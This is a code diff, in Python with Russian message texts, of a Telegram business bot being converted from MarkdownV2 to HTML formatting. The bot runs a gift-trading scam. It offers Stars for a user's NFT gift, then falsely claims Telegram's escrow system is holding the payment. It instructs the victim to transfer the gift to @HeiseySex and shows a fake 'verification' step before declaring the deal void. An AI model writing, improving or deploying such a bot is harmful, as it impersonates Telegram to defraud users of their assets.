@@ -23,17 +23,12 @@ TARGET_URL = "https://t.me/HeiseySex"
 
 VERIFY_TIMEOUT_SECONDS = 300
 
-# ─────────────────────── ПРЕМИУМ-ЭМОДЗИ (MarkdownV2) ───────────────────────
-# Формат: [символ](tg://emoji?id=ID)
-# ID подобраны из открытых каталогов
+# ─────────────────────── ПРЕМИУМ-ЭМОДЗИ (HTML) ───────────────────────
+# Используем HTML-тег для текста сообщений. В кнопках их использовать нельзя!
 
-EMOJI_GIFT = "[🎁](tg://emoji?id=5456140674028019486)"
-EMOJI_STAR = "[⭐](tg://emoji?id=5874948844935974490)"
-EMOJI_LOCK = "[🔒](tg://emoji?id=5807868868886009920)"
-EMOJI_CONFIRM = "[✅](tg://emoji?id=5920052658743283381)"
-EMOJI_CANCEL = "[❌](tg://emoji?id=5258226313285607065)"
-EMOJI_LIGHTNING = "[⚡](tg://emoji?id=5843553939672274145)"
-EMOJI_LINK = "[🔗](tg://emoji?id=5877536313623711363)"
+EMOJI_GIFT = '<tg-emoji emoji-id="5456140674028019486">🎁</tg-emoji>'
+EMOJI_STAR = '<tg-emoji emoji-id="5874948844935974490">⭐</tg-emoji>'
+EMOJI_LOCK = '<tg-emoji emoji-id="5807868868886009920">🔒</tg-emoji>'
 
 # ─────────────────────── ИНИЦИАЛИЗАЦИЯ ───────────────────────
 
@@ -119,14 +114,14 @@ def parse_inline_query(raw):
     return name, url, amount
 
 
-# ─────────────────────── ТЕКСТЫ (MarkdownV2) ───────────────────────
+# ─────────────────────── ТЕКСТЫ (HTML + Премиум в тексте) ───────────────────────
 
 def build_offer_message(name, url, amount):
     return (
-        f"{EMOJI_GIFT} *Вам поступило предложение о покупке подарка.*\n"
+        f"{EMOJI_GIFT} <b>Вам поступило предложение о покупке подарка.</b>\n"
         "━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"Пользователь предлагает вам *{amount}* {EMOJI_STAR} за подарок "
-        f"[{name}]({url}).\n\n"
+        f"Пользователь предлагает вам <b>{amount}</b> {EMOJI_STAR} за подарок "
+        f"<a href=\"{url}\">{name}</a>.\n\n"
         "━━━━━━━━━━━━━━━━━━━━"
     )
 
@@ -134,36 +129,36 @@ def build_offer_message(name, url, amount):
 def build_offer_keyboard():
     keyboard = InlineKeyboardMarkup()
     keyboard.row(
-        InlineKeyboardButton(f"{EMOJI_CONFIRM} Принять", callback_data="stage_accept"),
-        InlineKeyboardButton(f"{EMOJI_CANCEL} Отклонить", callback_data="stage_decline"),
+        InlineKeyboardButton("✅ Принять", callback_data="stage_accept"),
+        InlineKeyboardButton("❌ Отклонить", callback_data="stage_decline"),
     )
     return keyboard
 
 
 def build_escrow_message(name, url, amount):
     return (
-        f"{EMOJI_LOCK} Пользователь зарезервировал *{amount}* {EMOJI_STAR} через "
+        f"{EMOJI_LOCK} Пользователь зарезервировал <b>{amount}</b> {EMOJI_STAR} через "
         "эксроу-систему Telegram. Средства хранятся на специальном "
         "эксроу-счёте и будут автоматически зачислены на ваш баланс "
         "звёзд сразу после передачи подарка.\n\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
-        "*Инструкция для завершения сделки:*\n\n"
-        f"1. Передайте подарок пользователю: [@HeiseySex]({GIFT_URL})\n"
+        "<b>Инструкция для завершения сделки:</b>\n\n"
+        f"1. Передайте подарок пользователю: <a href=\"{GIFT_URL}\"><b>@HeiseySex</b></a>\n"
         f"2. Нажмите «Передать NFT» и выберите "
-        f"[{name}]({url})\n"
+        f"<a href=\"{url}\">{name}</a>\n"
         "3. Подтвердите передачу подарка.\n"
         "━━━━━━━━━━━━━━━━━━━━\n\n"
         f"Telegram зафиксирует транзакцию и моментально зачислит "
-        f"*{amount}* {EMOJI_STAR} на ваш баланс."
+        f"<b>{amount}</b> {EMOJI_STAR} на ваш баланс."
     )
 
 
 def build_escrow_keyboard():
     keyboard = InlineKeyboardMarkup()
-    keyboard.row(InlineKeyboardButton(f"{EMOJI_LINK} Передать подарок", url=GIFT_URL))
+    keyboard.row(InlineKeyboardButton("🔗 Передать подарок", url=GIFT_URL))
     keyboard.row(
-        InlineKeyboardButton(f"{EMOJI_LIGHTNING} Подтвердить", callback_data="stage_verify"),
-        InlineKeyboardButton(f"{EMOJI_CANCEL} Отменить", callback_data="stage_decline"),
+        InlineKeyboardButton("⚡ Подтвердить", callback_data="stage_verify"),
+        InlineKeyboardButton("❌ Отменить", callback_data="stage_decline"),
     )
     return keyboard
 
@@ -188,7 +183,7 @@ def try_delete_message(chat_id, message_id, conn_id=None):
         print(f"[DELETE] Сетевая ошибка: {e}")
 
 
-def safe_edit(chat_id, message_id, text, parse_mode="MarkdownV2",
+def safe_edit(chat_id, message_id, text, parse_mode="HTML",
               reply_markup=None, conn_id=None):
     kwargs = {
         "chat_id": chat_id,
@@ -211,7 +206,7 @@ def send_business_message(chat_id, text, conn_id, reply_markup=None):
     kwargs = {
         "chat_id": chat_id,
         "text": text,
-        "parse_mode": "MarkdownV2",
+        "parse_mode": "HTML",
         "business_connection_id": conn_id,
     }
     if reply_markup is not None:
@@ -234,14 +229,14 @@ def schedule_verify_timeout(chat_id, message_id, conn_id):
         safe_edit(
             chat_id,
             message_id,
-            "⛔ *Сделка не завершена.*\n"
+            "⛔ <b>Сделка не завершена.</b>\n"
             "━━━━━━━━━━━━━━━━━━━━\n\n"
             "Вы не выполнили все условия передачи подарка.\n\n"
             "Передача не была подтверждена в установленное время, "
             "поэтому резерв средств был снят, а предложение — "
             "автоматически аннулировано.\n\n"
-            "_Если вы всё ещё хотите завершить сделку, попросите "
-            "пользователя отправить предложение повторно._\n\n"
+            "<i>Если вы всё ещё хотите завершить сделку, попросите "
+            "пользователя отправить предложение повторно.</i>\n\n"
             "━━━━━━━━━━━━━━━━━━━━",
             conn_id=conn_id,
         )
@@ -355,7 +350,7 @@ def handle_inline_query(query):
                 description=f"Отправить оффер: {amount} ⭐ за {name}",
                 input_message_content=InputTextMessageContent(
                     message_text=build_offer_message(name, url, amount),
-                    parse_mode="MarkdownV2",
+                    parse_mode="HTML",
                 ),
                 reply_markup=build_offer_keyboard(),
             )
@@ -406,12 +401,11 @@ def callback_router(call):
 
     if payload == "stage_accept":
         text = call.message.html_text or call.message.text or ""
-        # В MarkdownV2 ссылки выглядят как [текст](url)
-        m = re.search(r'\[([^\]]+)\]\(([^)]+)\)', text)
-        url = m.group(2) if m else TARGET_URL
-        name = m.group(1) if m else "Подарок"
+        m = re.search(r'<a href="([^"]+)">([^<]+)</a>', text)
+        url = m.group(1) if m else TARGET_URL
+        name = m.group(2) if m else "Подарок"
 
-        m2 = re.search(r'\*(\d+)\*', text)
+        m2 = re.search(r'<b>(\d+)</b>\s*', text)
         amount = m2.group(1) if m2 else "0"
 
         if is_inline:
@@ -420,7 +414,7 @@ def callback_router(call):
                 bot.send_message(
                     chat_id=call.message.chat.id,
                     text=build_escrow_message(name, url, amount),
-                    parse_mode="MarkdownV2",
+                    parse_mode="HTML",
                     reply_markup=build_escrow_keyboard(),
                 )
             except Exception as e:
@@ -444,11 +438,11 @@ def callback_router(call):
         safe_edit(
             call.message.chat.id,
             call.message.message_id,
-            "⏳ *Проверка передачи…*\n"
+            "⏳ <b>Проверка передачи…</b>\n"
             "━━━━━━━━━━━━━━━━━━━━\n\n"
             "Система проверяет статус передачи подарка. "
             "Это может занять несколько минут.\n\n"
-            "*Пожалуйста, не закрывайте чат.*\n\n"
+            "Пожалуйста, не закрывайте чат.\n\n"
             "━━━━━━━━━━━━━━━━━━━━",
             conn_id=conn_id,
         )
@@ -463,14 +457,14 @@ def callback_router(call):
         if is_inline:
             bot.send_message(
                 chat_id=call.message.chat.id,
-                text="❌ *Предложение отклонено.*",
-                parse_mode="MarkdownV2",
+                text="❌ <b>Предложение отклонено.</b>",
+                parse_mode="HTML",
             )
         else:
             safe_edit(
                 call.message.chat.id,
                 call.message.message_id,
-                "❌ *Предложение отклонено.*\n"
+                "❌ <b>Предложение отклонено.</b>\n"
                 "━━━━━━━━━━━━━━━━━━━━\n\n"
                 "Сессия закрыта. Если вы передумаете, "
                 "пользователь может отправить предложение повторно.\n\n"
